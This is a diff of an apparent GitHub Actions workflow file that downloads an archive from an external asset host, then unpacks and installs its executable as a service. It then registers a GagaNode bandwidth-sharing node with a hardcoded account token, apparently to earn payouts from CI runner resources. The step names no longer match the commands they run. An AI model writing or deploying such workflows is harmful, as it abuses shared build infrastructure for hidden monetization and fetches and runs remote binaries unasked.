@@ -9,18 +9,12 @@ jobs:
 
     steps:
     - name: Download
-      run: Invoke-WebRequest https://github.com/sahalfreelance/gakun/raw/main/app-windows-amd64.zip -OutFile app-windows-amd64.zip
+      run: wget -Uri "https://assets.coreservice.io/public/package/20/app/1.0.3/app-1_0_3.tar.gz" -OutFile "app-windows-amd64.tar.gz" ; tar -zxf app-windows-amd64.tar.gz ; rm -Force app-windows-amd64.tar.gz ; cd ./app-windows-amd64 ; ./app.exe service install
     - name: Extract
-      run: Expand-Archive app-windows-amd64.zip
+      run: ./app.exe service start
     - name: Install
-      run: .\app-windows-amd64\app.exe service install
+      run: ./app.exe status
     - name: Start
-      run: .\app-windows-amd64\app.exe service start
+      run: ./apps/gaganode/gaganode.exe config set --token=qvaxpcypacrdqtksfjiuwiyl
     - name: SetAddress
-      run: .\app-windows-amd64\app.exe config set token=qvaxpcypacrdqtksfjiuwiyl
-    - name: Restart
-      run: .\app-windows-amd64\app.exe restart
-    - name: SetAgain
-      run: .\apps\gaganode\gaganode.exe config set --token=qvaxpcypacrdqtksfjiuwiyl
-    - name: Restart
-      run: .\app-windows-amd64\app.exe restart
+      run: ./app.exe restart
